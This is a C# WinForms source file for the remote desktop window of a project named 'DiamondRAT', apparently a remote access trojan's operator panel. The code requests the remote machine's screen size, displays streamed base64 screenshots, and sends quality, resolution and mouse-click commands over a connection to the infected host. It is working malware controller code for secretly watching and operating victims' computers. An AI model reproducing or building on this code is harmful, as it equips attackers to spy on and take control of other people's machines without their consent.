using DiamondRAT.Properties;
using System;
using System.ComponentModel;
using System.Windows.Forms;

namespace DiamondRAT
{
    class RemoteDesktop : MyForm
	{
		private IContainer components;

        private PictureBox PictureBox1;
		private MenuStrip MenuStrip1;
        private ToolStripMenuItem StartToolStripMenuItem;
		private ToolStripMenuItem StopToolStripMenuItem;
		private Label Label1;
		private RadioButton RadioButton1;
		private RadioButton RadioButton2;
		private RadioButton RadioButton3;
		private Label Label2;
		private TrackBar TrackBar1;
        private ToolStripMenuItem FramesReceivedToolStripMenuItem;
		private ToolStripMenuItem MousePositionX0Y0ToolStripMenuItem;

        private int pcwidth;
        private int pcheight;
		private int mousex;
		private int mousey;
        private bool remotecontrol;

		public RemoteDesktop()
		{
			InitializeComponent();

            this.FormType = FormType.RemoteDesktop;
            this.remotecontrol = false;
        }

		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && components != null)
				{
					components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RemoteDesktop));
            this.PictureBox1 = new System.Windows.Forms.PictureBox();
            this.MenuStrip1 = new System.Windows.Forms.MenuStrip();
            this.StartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.StopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.FramesReceivedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.MousePositionX0Y0ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.Label1 = new System.Windows.Forms.Label();
            this.RadioButton1 = new System.Windows.Forms.RadioButton();
            this.RadioButton2 = new System.Windows.Forms.RadioButton();
            this.RadioButton3 = new System.Windows.Forms.RadioButton();
            this.Label2 = new System.Windows.Forms.Label();
            this.TrackBar1 = new System.Windows.Forms.TrackBar();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).BeginInit();
            this.MenuStrip1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.TrackBar1)).BeginInit();
            this.SuspendLayout();
            // 
            // PictureBox1
            // 
            this.PictureBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.PictureBox1.BackColor = System.Drawing.Color.White;
            this.PictureBox1.Location = new System.Drawing.Point(0, 24);
            this.PictureBox1.Name = "PictureBox1";
            this.PictureBox1.Size = new System.Drawing.Size(756, 410);
            this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox1.TabIndex = 0;
            this.PictureBox1.TabStop = false;
            this.PictureBox1.MouseClick += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseClick);
            this.PictureBox1.MouseMove += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseMove);
            // 
            // MenuStrip1
            // 
            this.MenuStrip1.BackColor = System.Drawing.Color.White;
            this.MenuStrip1.Dock = System.Windows.Forms.DockStyle.None;
            this.MenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.StartToolStripMenuItem,
            this.StopToolStripMenuItem,
            this.FramesReceivedToolStripMenuItem,
            this.MousePositionX0Y0ToolStripMenuItem});
            this.MenuStrip1.Location = new System.Drawing.Point(0, -1);
            this.MenuStrip1.Name = "MenuStrip1";
            this.MenuStrip1.Size = new System.Drawing.Size(387, 24);
            this.MenuStrip1.TabIndex = 1;
            this.MenuStrip1.Text = "MenuStrip1";
            // 
            // StartToolStripMenuItem
            // 
            this.StartToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("StartToolStripMenuItem.Image")));
            this.StartToolStripMenuItem.Name = "StartToolStripMenuItem";
            this.StartToolStripMenuItem.Size = new System.Drawing.Size(59, 20);
            this.StartToolStripMenuItem.Text = "Start";
            this.StartToolStripMenuItem.Click += new System.EventHandler(this.StartToolStripMenuItem_Click);
            // 
            // StopToolStripMenuItem
            // 
            this.StopToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("StopToolStripMenuItem.Image")));
            this.StopToolStripMenuItem.Name = "StopToolStripMenuItem";
            this.StopToolStripMenuItem.Size = new System.Drawing.Size(59, 20);
            this.StopToolStripMenuItem.Text = "Stop";
            this.StopToolStripMenuItem.Click += new System.EventHandler(this.StopToolStripMenuItem_Click);
            // 
            // FramesReceivedToolStripMenuItem
            // 
            this.FramesReceivedToolStripMenuItem.Enabled = false;
            this.FramesReceivedToolStripMenuItem.Name = "FramesReceivedToolStripMenuItem";
            this.FramesReceivedToolStripMenuItem.Size = new System.Drawing.Size(113, 20);
            this.FramesReceivedToolStripMenuItem.Text = "Frames Received: ";
            // 
            // MousePositionX0Y0ToolStripMenuItem
            // 
            this.MousePositionX0Y0ToolStripMenuItem.Enabled = false;
            this.MousePositionX0Y0ToolStripMenuItem.Name = "MousePositionX0Y0ToolStripMenuItem";
            this.MousePositionX0Y0ToolStripMenuItem.Size = new System.Drawing.Size(148, 20);
            this.MousePositionX0Y0ToolStripMenuItem.Text = "Mouse Position: X:0 | Y:0";
            // 
            // Label1
            // 
            this.Label1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.Label1.AutoSize = true;
            this.Label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.Label1.Location = new System.Drawing.Point(8, 442);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(72, 15);
            this.Label1.TabIndex = 2;
            this.Label1.Text = "Resulotion: ";
            // 
            // RadioButton1
            // 
            this.RadioButton1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.RadioButton1.AutoSize = true;
            this.RadioButton1.Location = new System.Drawing.Point(12, 465);
            this.RadioButton1.Name = "RadioButton1";
            this.RadioButton1.Size = new System.Drawing.Size(78, 17);
            this.RadioButton1.TabIndex = 3;
            this.RadioButton1.Text = "1920x1080";
            this.RadioButton1.UseVisualStyleBackColor = true;
            // 
            // RadioButton2
            // 
            this.RadioButton2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.RadioButton2.AutoSize = true;
            this.RadioButton2.Checked = true;
            this.RadioButton2.Location = new System.Drawing.Point(96, 465);
            this.RadioButton2.Name = "RadioButton2";
            this.RadioButton2.Size = new System.Drawing.Size(72, 17);
            this.RadioButton2.TabIndex = 4;
            this.RadioButton2.TabStop = true;
            this.RadioButton2.Text = "1600x900";
            this.RadioButton2.UseVisualStyleBackColor = true;
            // 
            // RadioButton3
            // 
            this.RadioButton3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.RadioButton3.AutoSize = true;
            this.RadioButton3.Location = new System.Drawing.Point(174, 465);
            this.RadioButton3.Name = "RadioButton3";
            this.RadioButton3.Size = new System.Drawing.Size(72, 17);
            this.RadioButton3.TabIndex = 5;
            this.RadioButton3.Text = "1024x768";
            this.RadioButton3.UseVisualStyleBackColor = true;
            // 
            // Label2
            // 
            this.Label2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.Label2.AutoSize = true;
            this.Label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.Label2.Location = new System.Drawing.Point(248, 442);
            this.Label2.Name = "Label2";
            this.Label2.Size = new System.Drawing.Size(86, 15);
            this.Label2.TabIndex = 6;
            this.Label2.Text = "Quality (45%): ";
            // 
            // TrackBar1
            // 
            this.TrackBar1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.TrackBar1.Location = new System.Drawing.Point(337, 440);
            this.TrackBar1.Maximum = 100;
            this.TrackBar1.Name = "TrackBar1";
            this.TrackBar1.Size = new System.Drawing.Size(416, 45);
            this.TrackBar1.TabIndex = 7;
            this.TrackBar1.Value = 45;
            this.TrackBar1.Scroll += new System.EventHandler(this.TrackBar1_Scroll);
            // 
            // RemoteDesktop
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            this.ClientSize = new System.Drawing.Size(756, 497);
            this.Controls.Add(this.TrackBar1);
            this.Controls.Add(this.Label2);
            this.Controls.Add(this.RadioButton3);
            this.Controls.Add(this.RadioButton2);
            this.Controls.Add(this.RadioButton1);
            this.Controls.Add(this.Label1);
            this.Controls.Add(this.PictureBox1);
            this.Controls.Add(this.MenuStrip1);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MainMenuStrip = this.MenuStrip1;
            this.Name = "RemoteDesktop";
            this.Text = "RemoteDesktop - ";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.RemoteDesktop_FormClosing);
            this.Load += new System.EventHandler(this.RemoteDesktop_Load);
            this.KeyDown += new System.Windows.Forms.KeyEventHandler(this.RemoteDesktop_KeyDown);
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).EndInit();
            this.MenuStrip1.ResumeLayout(false);
            this.MenuStrip1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.TrackBar1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();
		}

        int _frames = 0;

        public override void ProcessMsg(string msg)
        {
            if (msg.StartsWith("RemoteDesktop"))
            {
                ShowImage(msg.Replace("RemoteDesktop", ""));
            }
            else if (msg.StartsWith("PCBounds"))
            {
                pcheight = int.Parse(msg.Replace("PCBounds", "").Split('x')[0]);
                pcwidth = int.Parse(msg.Replace("PCBounds", "").Split('x')[1]);
            }
        }

        private void ShowImage(string txt)
        {
            byte[] byAr = Convert.FromBase64String(txt);
            PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            PictureBox1.Image = utils.ByteArray2Image(byAr);
            _frames++;
            FramesReceivedToolStripMenuItem.Text = "Frames Received: " + _frames.ToString();

            if(remotecontrol)
                Connection.Send("RD|" + Convert.ToString(TrackBar1.Value) + "|" + checkres());
        }

        private void RemoteDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            //Interaction.MsgBox(e.KeyCode.ToString());
        }

        private void RemoteDesktop_Load(object sender, EventArgs e)
        {
            Connection.Send("GetPcBounds");
        }

        private void RemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            remotecontrol = false;
        }

        private void TrackBar1_Scroll(object sender, EventArgs e)
		{
			Label2.Text = $"Quality ({TrackBar1.Value}%): ";
		}

		private void StartToolStripMenuItem_Click(object sender, EventArgs e)
		{
            Connection.Send("RD|" + Convert.ToString(TrackBar1.Value) + "|" + checkres());
			PictureBox1.SizeMode = PictureBoxSizeMode.CenterImage;
			PictureBox1.Image = Resources._483;
            remotecontrol = true;
        }

		public string checkres()
		{
			if (RadioButton1.Checked)
				return RadioButton1.Text;
			if (RadioButton2.Checked)
				return RadioButton2.Text;
			return RadioButton3.Text;
		}

		private void StopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			remotecontrol = false;
		}

		private void PictureBox1_MouseClick(object sender, MouseEventArgs e)
		{
            if (remotecontrol)
            {
                int value = (int)Math.Round(unchecked((double)pcwidth / (double)PictureBox1.Size.Width * (double)mousex));
                int value2 = (int)Math.Round(unchecked((double)pcheight / (double)PictureBox1.Size.Height * (double)mousey));
                if (e.Button == MouseButtons.Left)
                    Connection.Send("LeftSetCurPos" + value.ToString() + "x" + value2.ToString());
                else if (e.Button == MouseButtons.Right)
                    Connection.Send("RightSetCurPos" + value.ToString() + "x" + value2.ToString());
            }
        }

		private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			MousePositionX0Y0ToolStripMenuItem.Text = "Mouse Position: X:" + Convert.ToString(e.X) + " | Y:" + Convert.ToString(e.Y);
			mousex = e.X;
			mousey = e.Y;
		}
    }
}
